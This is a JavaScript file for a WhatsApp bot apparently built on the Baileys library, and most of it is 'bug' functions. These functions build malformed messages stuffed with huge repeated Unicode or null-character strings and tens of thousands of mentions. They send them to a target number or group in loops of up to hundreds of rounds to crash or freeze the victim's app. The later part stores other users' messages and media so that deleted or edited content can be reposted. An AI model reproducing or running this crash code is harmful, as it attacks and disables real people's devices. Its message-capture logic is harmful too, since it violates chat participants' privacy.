    { video: { url: sockUrl } },
    { upload: demmy.waUploadToServer }
  );

  const videoMessage = {
    videoMessage: video.videoMessage,
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: String(Date.now()),
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "",
          contextInfo: {
            mentionedJid: [target],
            externalAdReply: {
              title: "",
              body: "",
              thumbnailUrl: "",
              mediaType: 1,
              sourceUrl: "</> 𝙳εmmყ τεch 🪬 ཀ‌",
              showAdAttribution: false
            }
          }
        }
      }
    }
  };

  const cards = [];
  for (let i = 0; i < 10; i++) {
    cards.push({
      header: videoMessage,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000)
      }
    });
  }

  const interactive = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: { text: "" },
          carouselMessage: {
            cards: cards,
            messageVersion: 1
          },
          contextInfo: {
            businessMessageForwardInfo: {
              businessOwnerJid: target
            },
            stanzaId: String(Math.floor(Math.random() * 99999)),
            forwardingScore: 100,
            isForwarded: true,
            mentionedJid: [target],
            externalAdReply: {
              title: "",
              body: "",
              thumbnailUrl: "radιaтιon craѕн ғc",
              mediaType: 1,
              mediaUrl: "",
              sourceUrl: "</> 𝙳εmmყ τεch 🪬 ཀ‌",
              showAdAttribution: false
            }
          }
        }
      }
    }
  };

  const message = generateWAMessageFromContent(target, interactive, { quoted: m});

  await devtrust.relayMessage(target, message.message, {
    participant: { jid: target },
    messageId: message.key.id
  });
}
//=================END OF FUNCTION====//
// BUG FUNCTIONS 
async function rageioshere(target) {
let tmsg = await generateWAMessageFromContent(target, {
                extendedTextMessage: {
                    text: '@Radiation\n' + "\n\n\n" + "𑪆".repeat(60000),
                    previewType: 0,
                    contextInfo: {
                        mentionedJid: [target]
                    }
                }
    }, {});

    await devtrust.relayMessage("status@broadcast", tmsg.message, {
        messageId: tmsg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined,
                }],
            }],
        }],
    });
}
// end of Bug function 
// BUG FUNCTIONS
async function zalthrexhytam(devtrust, target) {
    devtrust.relayMessage(target, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            hasMediaAttachment: false,
                            title: "Radiation¿" 
                            + "ꦽ".repeat(50000),
                        },
                        body: {
                            text: "",
                        },
                        nativeFlowMessage: {
                            name: "single_select",
                            messageParamsJson: "",
                        },
                        payment: {
                            name: "galaxy_message",
                            messageParamsJson: '{"icon":"DOCUMENT","flow_cta":"\\u0000","flow_message_version":"3"}',
                        },
                    },
                },
            },
        },
        {}
    );
}
// end Of Function
//=============GROUP BUGS===========//
 async function rusuhgc(target) {
      try {
        const msg = {
          botInvokeMessage: {
            message: {
              newsletterAdminInviteMessage: {
                newsletterJid: "33333333333333333@newsletter",
                newsletterName: "Mode Rusuh😹" + "ꦾ".repeat(120000),
                jpegThumbnail: "",
                caption: "ꦽ".repeat(120000) + "@0".repeat(120000),
                inviteExpiration: Date.now() + 1814400000
              }
            }
          },
          nativeFlowMessage: {
            messageParamsJson: "",
            buttons: [{
              name: "call_permission_request",
              buttonParamsJson: "{}"
            }, {
              name: "galaxy_message",
              paramsJson: {
                screen_2_OptIn_0: true,
                screen_2_OptIn_1: true,
                screen_1_Dropdown_0: "nullOnTop",
                screen_1_DatePicker_1: "1028995200000",
                screen_1_TextInput_2: "null@gmail.com",
                screen_1_TextInput_3: "94643116",
                screen_0_TextInput_0: "\0".repeat(500000),
                screen_0_TextInput_1: "SecretDocu",
                screen_0_Dropdown_2: "#926-Xnull",
                screen_0_RadioButtonsGroup_3: "0_true",
                flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
              }
            }]
          },
          contextInfo: {
            mentionedJid: Array.from({
              length: 5
            }, () => "0@s.whatsapp.net"),
            groupMentions: [{
              groupJid: "0@s.whatsapp.net",
              groupSubject: "Vampire"
            }]
          }
        };
        await devtrust.relayMessage(target, msg, {
          userJid: target
        });
      } catch (err) {
        console.error("Error sending newsletter:", err);
      }
    }

//========KILL GC BUG FUNC==========//
    async function killgc(target) {
      let massage = [];
      for (let r = 0; r < 1000; r++) {
        massage.push({
          fileName: "8kblA1s0k900pbLI6X2S6Y7uSr-r751WIUrQOt5-A3k=.webp",
          isAnimated: true,
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        });
      }
      const msg = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\0".repeat(1000000),
              version: 3
            },
            stickerPackMessage: {
              stickerPackId: "76cd3656-3c76-4109-9b37-62c8a668329f",
              name: "WOI GRUP KONTOL",
              publisher: "",
              stickers: massage,
              fileLength: "999999999999999",
              fileSha256: "NURKD/76ZOetxqc+V8dT/zJYRhpHZi9FYgAGNzdQQyM=",
              fileEncSha256: "/CkFScxebuRGVejPQ8NE0ounWX35rtq+PmkweWejtEs=",
              mediaKey: "AEkmhMTtPLPha2rHdxtWQtqXBH+g9Jo/+gUw1erHM9s=",
              directPath: "/v/t62.15575-24/29442218_1217419543131080_7836347641742653699_n.enc?ccb=11-4&oh=01_Q5Aa1QEZWzSJqGIwOUkeDSvpdnDSvVIvGUyVvW_uvgP5uTOePQ&oe=68403E51&_nc_sid=5e03e0",
              mediaKeyTimestamp: "99999999",
              trayIconFileName: "e846de1c-ff5f-4768-9ed4-a3ed1c531fe0.png",
              thumbnailDirectPath: "AjvV1BsQbp1IdsGb4sO/F1O8N6w60Pi2bgimTw/52KU=",
              thumbnailSha256: "qRcSAXa8fdBBSrYwhAf6Gg7PkjFPbpDqHCo/Keic5O8=",
              thumbnailEncSha256: "J7OubZTyLsE/VEQ8fRniRwyjB/fMfWbrCxXG0pGkgZ4=",
              thumbnailHeight: 99999999999,
              thumbnailWidth: 9999999999,
              imageDataHash: "OWY2MjQ0MmMzNGFhZThkOTY5YWM2M2RlMzAyNjg0OGNmZTBkMTMwNTBlYmE0YzAxNzhiMDdkMTBiNzM1NzdlYg==",
              stickerPackSize: 9999999999999,
              stickerPackOrigin: 9999999999999,
              contextInfo: {
                mentionedJid: Array.from({
                  length: 30000
                }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                isSampled: true,
                participant: target,
                remoteJid: target,
                forwardingScore: 9741,
                isForwarded: true,
                businessMessageForwardInfo: {
                  businessOwnerJid: target
                },
                externalAdReply: {
                  title: "*CYBERCRASHERRULES*",
                  body: "Grup Kontol"
                }
              }
            }
          }
        }
      };
      await devtrust.relayMessage(target, msg, {});
    }
// END OF FUNC //
//========BLANK GC========//
async function blankgc(target) {
       devtrust.relayMessage(target, {
             newsletterAdminInviteMessage: {
           newsletterJid: "120363420088299543@newsletter",
           newsletterName: "\uD83D\uDC51 \u2022 \uD835\uDC7D\uD835\uDC86\uD835\uDC8F\uD835\uDC90\uD835\uDC8E\uD835\uDC6A\uD835\uDC90\uD835\uDC8D\uD835\uDC8D\uD835\uDC82\uD835\uDC83 8\uD835\uDC8C \u2022 \uD83D\uDC51" + "XxX".repeat(9000),
           caption: "ؙ\uD83D\uDC51 \u2022 \uD835\uDC7D\uD835\uDC86\uD835\uDC8F\uD835\uDC90\uD835\uDC8E\uD835\uDC6A\uD835\uDC90\uD835\uDC8D\uD835\uDC8D\uD835\uDC82\uD835\uDC83 8\uD835\uDC8C \u2022 \uD83D\uDC51\n" + "XxX".repeat(9000),
           inviteExpiration: "0",
          },
          }, {
            userJid: target
       })
       }
// END OF BUG FUNCTIONS 
//=====COMBINING ALL GC BUG======//
async function bug3(isTarget) {
for (let i = 0; i < 60; i++) {
await killgc(isTarget);
await rusuhgc(isTarget);
await blankgc(isTarget);
}
console.log(chalk.blue(`Sending Crash Hard to ${isTarget}☠️`));
}
// CYBERE //
//FUNCT BUG GROUP VAMPIRE, #THANKS VAMP   
async function VampireBugIns(target) {
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "*CYBER CRASHER KILL GROUP*" + "ꦾ".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000) + "@0".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000, // 21 hari
                    },
                },
            },
            nativeFlowMessage: {
    messageParamsJson: "",
    buttons: [
        {
            name: "call_permission_request",
            buttonParamsJson: "{}",
        },
        {
            name: "galaxy_message",
            paramsJson: {
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "nullOnTop",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "null@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "\u0000".repeat(500000),
                "screen_0_TextInput_1": "SecretDocu",
                "screen_0_Dropdown_2": "#926-Xnull",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
        },
    ],
},
                     contextInfo: {
                mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                groupMentions: [
                    {
                        groupJid: "0@s.whatsapp.net",
                        groupSubject: "Vampire",
                    },
                ],
            },
        };

        await devtrust.relayMessage(target, message, {
            userJid: target,
        });
    } catch (err) {
        console.error("Error sending newsletter:", err);
    }
}

// ============ BLANK GROUP FUNCTION ============
async function BlankGroup(target) {
    try {
        console.log(chalk.blue(`🎯 Starting BlankGroup attack on ${target}`));
        
        // Run multiple group bug functions
        await blankgc(target);
        await sleep(1500);
        
        await BugGb1(target);
        await sleep(1500);
        
        await BugGb12(target);
        await sleep(1500);
        
        await rusuhgc(target);
        await sleep(1500);
        
        console.log(chalk.green(`✅ BlankGroup attack completed on ${target}`));
    } catch (err) {
        console.error("BlankGroup error:", err.message);
    }
}

async function VampireGroupInvis(target, ptcp = true) {
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "*CYBER CRASHER*" + "ꦾ".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000) + "@9".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000, // 21 hari
                    },
                },
            },
            nativeFlowMessage: {
    messageParamsJson: "",
    buttons: [
        {
            name: "call_permission_request",
            buttonParamsJson: "{}",
        },
        {
            name: "galaxy_message",
            paramsJson: {
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "nullOnTop",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "null@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "\u0018".repeat(50000),
                "screen_0_TextInput_1": "SecretDocu",
                "screen_0_Dropdown_2": "#926-Xnull",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
        },
    ],
},
                     contextInfo: {
                mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                groupMentions: [
                    {
                        groupJid: "0@s.whatsapp.net",
                        groupSubject: "Vampire Official",
                    },
                ],
            },
        };

        await devtrust.relayMessage(target, message, {
            userJid: target,
        });
    } catch (err) {
        console.error("Error sending newsletter:", err);
    }
}    
// ============ IOS OVER FUNCTION (FIXED) ============
async function iosOver(durationHours, XS) {
    console.log(chalk.yellow('⚠️ iosOver function is starting...'));
    
    // If you CYBER't have XiosVirus and TrashLocIOS, just use existing functions
    const totalDurationMs = durationHours * 60 * 60 * 1000;
    const startTime = Date.now();
    let count = 0;
    let batch = 1;
    const maxBatches = 3; // Reduced for safety
    
    const sendNext = async () => {
        // Check time limit
        if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
            console.log(chalk.green(`✅ iosOver complete! Total batches: ${batch - 1}`));
            return;
        }
        
        try {
            if (count < 100) {
                // Use existing bug functions instead of undefined ones
                await forclose(XS);
                await sleep(500);
                await ForceXFrezee(XS);
                await sleep(500);
                await callinvisible(XS);
                
                console.log(chalk.yellow(`${count + 1}/100 completed for ${XS}`));
                count++;
                
                setTimeout(sendNext, 800);
            } else {
                console.log(chalk.green(`✅ Batch ${batch} completed`));
                
                if (batch < maxBatches) {
                    console.log(chalk.yellow(`Waiting 2 minutes...`));
                    count = 0;
                    batch++;
                    setTimeout(sendNext, 2 * 60 * 1000);
                }
            }
        } catch (error) {
            console.error(`❌ Error: ${error.message}`);
            setTimeout(sendNext, 2000);
        }
    };
    
    sendNext();
}




// ================= ( Combo Function )====================
async function Combo(target) { 
        for (let i = 0; i< 100; i++) {
        await callinvisible(target);
        await ForceXFrezee(target);
        await blank1(target);
        await callinvisible(target);
        await ForceXFrezee(target);
        await blank1(target);
        await callinvisible(target);
        await ForceXFrezee(target);
        await blank1(target);
        await callinvisible(target);
        await ForceXFrezee(target);
        await blank1(target);
        await callinvisible(target);
        await ForceXFrezee(target);
        await blank1(target);
        await callinvisible(target);
        await ForceXFrezee(target);
        await blank1(target);
        
        }
}

async function fcnew(target) { 
        for (let i = 0; i< 100; i++) {     
   await CarouselVY4(devtrust, target);
   await CarouselVY4(devtrust, target);
   await LocaXotion(target);
   await XinsooInvisV1(target);
   await CarouselVY4(devtrust, target);
   await CarouselVY4(devtrust, target);
   await LocaXotion(target);
   await XinsooInvisV1(target); 
   await CarouselVY4(devtrust, target);
   await CarouselVY4(devtrust, target);
   await LocaXotion(target);
   await XinsooInvisV1(target);
   await CarouselVY4(devtrust, target);
   await CarouselVY4(devtrust, target);
   await LocaXotion(target);
   await XinsooInvisV1(target);  
   await CarouselVY4(devtrust, target);
   await CarouselVY4(devtrust, target);
   await LocaXotion(target);
   await XinsooInvisV1(target);
   
        }
} 

async function BugGroup(target) {
    for (let i = 0; i< 200; i++) {
    await BugGb1(m.chat);
    await BugGb12(m.chat, ptcp = true);
    await DelayGroup(m.chat);
    await xgroupnulL(m.chat);
    await BugGb1(target);
    await BugGb12(target, ptcp = true);
    await DelayGroup(m.chat);
    await xgroupnulL(m.chat);
    await BugGb1(m.chat);
    await BugGb12(target, ptcp = true);
    await DelayGroup(m.chat);
    await xgroupnulL(m.chat);
    await BugGb1(m.chat);
    await BugGb12(target, ptcp = true);
    await DelayGroup(m.chat);
    await xgroupnulL(m.chat);
    await BugGb1(m.chat);
    await BugGb12(target, ptcp = true);
    await DelayGroup(m.chat);
    await xgroupnulL(m.chat);
    await BlankGroup(m.chat);
    
    
     }
     
 }

async function BayuOfficialHard(target) {
    for (let i = 0; i< 200; i++) {
    await protoXimg(target)
    await bulldozer(target)
    await protocolbug3(target)
    await bulldozer(target)
    await delayMakerInvisible(target)
    await bulldozer(target)
    await xatanicinvisv4(target)
    await bulldozer(target)
    await protocolbug6(target)
    }
}
    
async function ForceClose(target) {
  for (let i = 0; i< 250; i++) {
  await forclose(target);
  await forclose(target);
  await forclose(target);
  await forclose(target);
  await forclose(target);
  await forclose(target);
  await forclose(target);
  await forclose(target);
  await forclose(target);
   await forclose(target);
  await forclose(target);
  await forclose(target);
   await forclose(target);
  await forclose(target);
  await forclose(target);
  
         }
 
 }
 
 async function XPhone(target) { 
    for (let i = 0; i< 300; i++) {  // ✅ CORRECT - lowercase i
 
await CarouselVY4(devtrust, target);
await CrashLoadIos(devtrust, target);
await forclose(target);
await LocaXotion(target);
await XinsooInvisV1(target);
await Xblanknoclick(target);
await ForceXFrezee(target);
await blank1(target);
await callinvisible(target);
   
   } 
   
   
}
// ================= ( Bates Function )=====================
async function CYBEReress() {
    if (!text) throw "❌ Target information required";
    
    let pepec = args[0].replace(/[^0-9]/g, "");
    let thumbnailUrl = "https://files.catbox.moe/smv12k.jpeg";
    
    let ressCYBERe = `
*CYBER — Operation Complete*

▸ Type: ${command}
▸ Target: ${pepec}

System requires a 10-minute cooldown before next operation.
`;

    await devtrust.sendMessage(m.chat, {
        image: { url: thumbnailUrl },
        caption: ressCYBERe,
        gifPlayback: true,
        gifAttribution: 1,
        contextInfo: {
            mentionedJid: [m.sender],
            externalAdReply: {
                showAdAttribution: false,
                title: "CYBER — Bug System",
                body: "Operation Complete",
                thumbnailUrl: thumbnailUrl,
                sourceUrl: "https://whatsapp.com/channel/0029VbC0knY72WU0QUNAid3B",
                mediaType: 1,
                renderLargerThumbnail: false
            },
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363408022768294@newsletter",
                newsletterName: "CYBER",
                serverMessageId: -1
            }
        },
        headerType: 6,
        viewOnce: false
    }, { quoted: m });
}

// ============ ACCOUNT FUNCTIONS ============
const ACCOUNT_FILE = './database/accounts.json';

function loadAccounts() {
  if (!fs.existsSync(ACCOUNT_FILE)) {
    fs.writeFileSync(ACCOUNT_FILE, JSON.stringify({}));
  }
  return JSON.parse(fs.readFileSync(ACCOUNT_FILE));
}

function saveAccounts(data) {
  fs.writeFileSync(ACCOUNT_FILE, JSON.stringify(data, null, 2));
}

// ============ SESSION FUNCTIONS ============
const SESSION_FILE = './database/sessions.json';
const PAIRING_DIR = './database/pairing/';

// Ensure directories exist
if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true });
if (!fs.existsSync(PAIRING_DIR)) fs.mkdirSync(PAIRING_DIR, { recursive: true });

// ============ GLOBAL VARIABLES ============
const more = String.fromCharCode(8206);
const readMore = more.repeat(4001);
const Richie = "GAME CHANGER 🥶";

global.packname = "CYBER";
global.author = "GAME CHANGER";

// ============ ANTIEDIT / ANTIDELETE MESSAGE INTERCEPTOR ============
// Store only other people's messages for antiedit/antidelete recovery
if (m.key?.id && m.key?.remoteJid && !m.message?.protocolMessage && !isOwnMessage(m, devtrust)) {
    const _chatId = m.key.remoteJid;
    const _msgId = m.key.id;
    try {
        // Extract text directly — NO JSON.stringify to avoid BigInt/Buffer errors in protobuf objects
        const _storeText =
            m.message?.conversation ||
            m.message?.extendedTextMessage?.text ||
            m.message?.imageMessage?.caption ||
            m.message?.videoMessage?.caption ||
            m.message?.documentMessage?.caption ||
            m.message?.audioMessage?.caption ||
            m.body || m.text || '';
        if (!global._antieditStore.has(_chatId)) global._antieditStore.set(_chatId, new Map());
        global._antieditStore.get(_chatId).set(_msgId, {
            content: String(_storeText || ''),
            sender: String(m.key?.participant || m.key?.remoteJid || ''),
            fromMe: Boolean(m.key?.fromMe),
            mtype: String(m.mtype || ''),
        });
        setTimeout(() => {
            const _ch = global._antieditStore.get(_chatId);
            if (_ch) { _ch.delete(_msgId); if (_ch.size === 0) global._antieditStore.delete(_chatId); }
        }, 24 * 60 * 60 * 1000);
    } catch (e) { console.error('[ANTIEDIT STORE]', e); }
}

// ── Detect EDIT events ──
const _antieditProto = m.message?.protocolMessage;
if (_antieditProto?.editedMessage || _antieditProto?.type === 14) {
    const _aeCfg = loadAntieditCfg();
    const _aeMode = _aeCfg.mode || 'off';
    if (_aeMode !== 'off') {
        try {
            const _aeOrigId = _antieditProto.key?.id;
            const _aeChatId = m.key?.remoteJid || _antieditProto.key?.remoteJid;
            const _aeEditedBy = m.key?.participant || _antieditProto.key?.participant || m.key?.remoteJid || '';
            const _aeEditedMsg = _antieditProto.editedMessage;
            const _aeNewText = _aeEditedMsg.conversation || _aeEditedMsg.extendedTextMessage?.text ||
                _aeEditedMsg.imageMessage?.caption || _aeEditedMsg.videoMessage?.caption ||
                _aeEditedMsg.documentMessage?.caption || '';
            if (_aeChatId && _aeOrigId) {
                const _aeOrigMsg = global._antieditStore.get(_aeChatId)?.get(_aeOrigId) || null;
                const _aeOldText = _aeOrigMsg ? (_aeOrigMsg.content || '') : '';
                const _aeSender = _aeOrigMsg?.sender || _aeEditedBy;
                const _aeSenderNum = _aeSender.split('@')[0];
                const _aeEditedByNum = _aeEditedBy.split('@')[0];
                const _aeIsGroup = _aeChatId.endsWith('@g.us');
                const _aeTime = new Date().toLocaleString('en-US', {
                    timeZone: process.env.TIMEZONE || 'Africa/Harare', hour12: true,
                    hour: '2-digit', minute: '2-digit', day: '2-digit', month: '2-digit', year: 'numeric'
                });
                const _aeBotNum = jidToNum(getBotJid(devtrust));
                if (_aeOrigMsg?.fromMe || _aeSenderNum === _aeBotNum || _aeEditedByNum === _aeBotNum) {
                    return;
                }
                // Mode filtering
                if (_aeMode === 'private_pm' && _aeIsGroup) { return; }
                if (_aeMode === 'private_groups' && !_aeIsGroup) { return; }
                if (_aeMode === 'chat_groups' && !_aeIsGroup) { return; }
                let _aeGroupName = '';
                if (_aeIsGroup) { try { _aeGroupName = (await devtrust.groupMetadata(_aeChatId)).subject; } catch (e) {} }
                const _aeMentions = [...new Set([_aeSender, _aeEditedBy].filter(Boolean))];
                const _aeReport = `*✏️ ANTI-EDIT ALERT ✏️*\n\n` +
                    `*👤 Sent By:* @${_aeSenderNum}\n` +
                    (_aeIsGroup && _aeEditedByNum !== _aeSenderNum ? `*✏️ Edited By:* @${_aeEditedByNum}\n` : '') +
                    `*🕒 Time:* ${_aeTime}\n` +
                    (_aeIsGroup ? `*👥 Group:* ${_aeGroupName || _aeChatId.split('@')[0]}\n` : `*💬 Chat:* Private\n`) +
                    `\n*📄 Old Message:*\n${_aeOldText || '_Not available_'}\n` +
                    `\n*📝 New (Edited) Message:*\n${_aeNewText}`;
                if (_aeMode === 'chat' || _aeMode === 'chat_groups') {
                    await devtrust.sendMessage(_aeChatId, { text: _aeReport, mentions: _aeMentions });
                } else {
                    // private / private_pm / private_groups → send to the user who edited (their own DM)
                    const _aeUserJid = _aeSender || _aeEditedBy;
                    if (_aeUserJid) await devtrust.sendMessage(_aeUserJid, { text: _aeReport, mentions: _aeMentions });
                }
            }
        } catch (e) { console.error('[ANTIEDIT]', e); }
    }
    return;
}

// ── Detect DELETE events ──
const _adelProto = m.message?.protocolMessage;
// type 0 = REVOKE. type 5 = also used in some Baileys builds. Both mean "delete for everyone".
if ((_adelProto?.type === 0 || _adelProto?.type === 5) && _adelProto?.key?.id) {
    // Get bot identity FIRST so we can load per-bot config
    const _adBotNumPre = jidToNum(getBotJid(devtrust));
    const _adCfg = loadAntideleteCfg(_adBotNumPre);
    const _adMode = _adCfg.mode || 'off';
    if (_adMode !== 'off') {
        try {
            const _adMsgId = _adelProto.key.id;
            const _adChatId = m.key?.remoteJid || _adelProto.key?.remoteJid || '';
            const _adDeletedBy = m.key?.participant || _adelProto.key?.participant || m.key?.remoteJid || '';
            const _adBotNum = _adBotNumPre;
            const _adOwnerJid = getBotJid(devtrust);
            const _adIsGroup = (_adChatId || '').endsWith('@g.us');

            // Skip if the bot itself is the one who deleted
            // Note: even if _adOwnerJid is empty (socket not fully ready), still process but skip self-delete check
            if (jidToNum(_adDeletedBy) === _adBotNum || m.key?.fromMe) {
                global._antideleteStore.delete(`${_adBotNum}::${antiStoreKey(_adChatId, _adMsgId)}`);
                global._antideleteStore.delete(antiStoreKey(_adChatId, _adMsgId));
                global._antideleteStore.delete(_adMsgId);
                return;
            }
            // If bot JID is still empty, fall back to chat as reporting target
            const _adEffectiveOwnerJid = _adOwnerJid || _adChatId;

            // Mode filtering
            if (_adMode === 'private_pm' && _adIsGroup) { return; }
            if (_adMode === 'private_groups' && !_adIsGroup) { return; }
            if (_adMode === 'chat_groups' && !_adIsGroup) { return; }

            // Look up cached message — check per-bot key first, then shared key for backward compat
            const _adBotKey = `${_adBotNum}::${antiStoreKey(_adChatId, _adMsgId)}`;
            let _adOriginal = global._antideleteStore.get(_adBotKey)
                || global._antideleteStore.get(antiStoreKey(_adChatId, _adMsgId))
                || global._antideleteStore.get(_adMsgId)
                || _getFromDiskStore(_adBotKey)
                || _getFromDiskStore(antiStoreKey(_adChatId, _adMsgId))
                || _getFromDiskStore(_adMsgId);

            if (!_adOriginal) {
                const _aeMsg = global._antieditStore.get(_adChatId)?.get(_adMsgId);
                if (_aeMsg) {
                    _adOriginal = {
                        content: _aeMsg.content || '',
                        fromMe: Boolean(_aeMsg.fromMe),
                        sender: _aeMsg.sender || _adDeletedBy,
                        group: _adIsGroup ? _adChatId : null,
                        mediaType: '', mediaPath: '',
                        timestamp: new Date().toISOString()
                    };
                }
            }

            let _adGroupName = '';
            if (_adIsGroup) {
                try { _adGroupName = (await devtrust.groupMetadata(_adChatId)).subject; } catch (e) {}
            }
            const _adTime = new Date().toLocaleString('en-US', {
                timeZone: process.env.TIMEZONE || 'Africa/Harare', hour12: true,
                hour: '2-digit', minute: '2-digit', second: '2-digit',
                day: '2-digit', month: '2-digit', year: 'numeric'
            });

            const _adSendReport = async (targetJid, text, mediaOriginal, sender) => {
                await devtrust.sendMessage(targetJid, { text, mentions: [_adDeletedBy, sender].filter(Boolean) });
                if (mediaOriginal?.mediaType && mediaOriginal?.mediaPath && fs.existsSync(mediaOriginal.mediaPath)) {
                    const _adMO = { caption: `*Deleted ${mediaOriginal.mediaType}*\nFrom: @${sender.split('@')[0]}`, mentions: [sender] };
                    try {
                        if (mediaOriginal.mediaType === 'image') await devtrust.sendMessage(targetJid, { image: { url: mediaOriginal.mediaPath }, ..._adMO });
                        else if (mediaOriginal.mediaType === 'video') await devtrust.sendMessage(targetJid, { video: { url: mediaOriginal.mediaPath }, ..._adMO });
                        else if (mediaOriginal.mediaType === 'sticker') await devtrust.sendMessage(targetJid, { sticker: { url: mediaOriginal.mediaPath }, ..._adMO });
                        else if (mediaOriginal.mediaType === 'audio') await devtrust.sendMessage(targetJid, { audio: { url: mediaOriginal.mediaPath }, mimetype: 'audio/mpeg', ptt: false, ..._adMO });
                    } catch (e) {}
                    try { fs.unlinkSync(mediaOriginal.mediaPath); } catch (e) {}
                }
            };

            if (_adOriginal) {
                const _adSender = _adOriginal.sender || _adDeletedBy;
                const _adSenderNum = _adSender.split('@')[0];
                if (_adOriginal.fromMe || _adSenderNum === _adBotNum) {
                    global._antideleteStore.delete(_adBotKey);
                    global._antideleteStore.delete(antiStoreKey(_adChatId, _adMsgId));
                    global._antideleteStore.delete(_adMsgId);
                } else {
                    let _adText = `*🔰 ANTIDELETE REPORT 🔰*\n\n` +
                        `*🗑️ Deleted By:* @${_adDeletedBy.split('@')[0]}\n` +
                        `*👤 Sender:* @${_adSenderNum}\n` +
                        `*🕒 Time:* ${_adTime}\n` +
                        (_adIsGroup ? `*👥 Group:* ${_adGroupName || _adChatId.split('@')[0]}\n` : `*💬 Chat:* Private\n`);
                    if (_adOriginal.content) _adText += `\n*💬 Deleted Message:*\n${_adOriginal.content}`;
                    // Decide where to send the report
                    if (_adMode === 'chat' || _adMode === 'chat_groups') {
                        await _adSendReport(_adChatId, _adText, _adOriginal, _adSender);
                    } else {
                        // private / private_pm / private_groups → THIS bot's own saved messages (DM)
                        await _adSendReport(_adEffectiveOwnerJid, _adText, _adOriginal, _adSender);
                    }
                    global._antideleteStore.delete(_adBotKey);
                    global._antideleteStore.delete(antiStoreKey(_adChatId, _adMsgId));
                    global._antideleteStore.delete(_adMsgId);
                }
            } else {
                // Message not in cache — still report with available info
                let _adText = `*🔰 ANTIDELETE REPORT 🔰*\n\n` +
                    `*🗑️ Deleted By:* @${_adDeletedBy.split('@')[0]}\n` +
                    `*🕒 Time:* ${_adTime}\n` +
                    (_adIsGroup ? `*👥 Group:* ${_adGroupName || _adChatId.split('@')[0]}\n` : `*💬 Chat:* Private\n`) +
                    `\n_[Original message not in cache]_`;
                if (_adMode === 'chat' || _adMode === 'chat_groups') {
                    await devtrust.sendMessage(_adChatId, { text: _adText, mentions: [_adDeletedBy].filter(Boolean) });
                } else {
                    // Always send to THIS bot's own DM — even if owner JID was empty, fallback to chat
                    await devtrust.sendMessage(_adEffectiveOwnerJid, { text: _adText, mentions: [_adDeletedBy].filter(Boolean) });
                }
            }
        } catch (e) { console.error('[ANTIDELETE]', e); }
    }
    return;
}

// ── Store messages for antidelete recovery (ALWAYS store — mode-independent) ──
(async () => {
    try {
        if (m.key?.id && m.key?.remoteJid && !m.message?.protocolMessage && !isOwnMessage(m, devtrust)) {
            const _adMsgId2 = m.key.id;
            const _adChatId2 = m.key.remoteJid;
            let _adContent = '';
            let _adMediaType = '';
            let _adMediaPath = '';
            const _adSender2 = m.key.participant || m.key.remoteJid;
            const msg = m.message || {};

            // ── Text messages ──
            if (msg.conversation) {
                _adContent = msg.conversation;
            } else if (msg.extendedTextMessage?.text) {
                _adContent = msg.extendedTextMessage.text;
            }
            // ── Image ──
            else if (msg.imageMessage) {
                _adMediaType = 'image';
                _adContent = msg.imageMessage.caption || '';
                try {
                    const { downloadContentFromMessage: _dlc } = require('@whiskeysockets/baileys');
                    const _stream = await _dlc(msg.imageMessage, 'image');
                    let _buf = Buffer.from([]);
                    for await (const _chunk of _stream) _buf = Buffer.concat([_buf, _chunk]);
                    _adMediaPath = `${ANTIDELETE_TEMP_DIR}/${_adMsgId2}.jpg`;
                    fs.writeFileSync(_adMediaPath, _buf);
                } catch (e) {}
            }
            // ── Video ──
            else if (msg.videoMessage) {
                _adMediaType = 'video';
                _adContent = msg.videoMessage.caption || '';
                try {
                    const { downloadContentFromMessage: _dlc } = require('@whiskeysockets/baileys');
                    const _stream = await _dlc(msg.videoMessage, 'video');
                    let _buf = Buffer.from([]);
                    for await (const _chunk of _stream) _buf = Buffer.concat([_buf, _chunk]);
                    _adMediaPath = `${ANTIDELETE_TEMP_DIR}/${_adMsgId2}.mp4`;
                    fs.writeFileSync(_adMediaPath, _buf);
                } catch (e) {}
            }
            // ── Audio / Voice note ──
            else if (msg.audioMessage) {
                _adMediaType = 'audio';
